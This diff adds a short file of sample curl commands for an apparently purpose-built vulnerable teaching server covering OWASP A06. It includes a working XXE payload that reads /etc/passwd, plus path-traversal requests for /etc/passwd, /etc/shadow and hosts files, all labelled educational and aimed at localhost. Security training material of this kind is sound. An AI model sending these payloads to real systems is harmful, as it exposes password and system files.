@@ -1,0 +1,25 @@
+A06 - Vulnerable and Outdated Components - Sample Curl Commands
+================================================================
+
+Server: python A06_Example_Vulnerable_Components.py
+Port: 5001
+
+# Test XML processing (XXE vulnerability):
+curl -X POST http://localhost:5001/process_xml -H 'Content-Type: application/xml' -d '<user><name>test</name></user>'
+
+# Test XXE attack (EDUCATIONAL PURPOSES ONLY):
+curl -X POST http://localhost:5001/process_xml -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>'
+
+# Test file download:
+curl http://localhost:5001/download?file=test.txt
+
+# Test path traversal (EDUCATIONAL PURPOSES ONLY):
+curl http://localhost:5001/download?file=../../../etc/passwd
+curl http://localhost:5001/download?file=../../../../etc/hosts
+curl http://localhost:5001/download?file=../../../../../../etc/shadow
+
+# Test directory traversal on Windows (if applicable):
+curl 'http://localhost:5001/download?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'
+
+# Vulnerability: Unsafe XML parsing and unvalidated file path handling
+# Impact: Local file disclosure, potential remote code execution via XXE
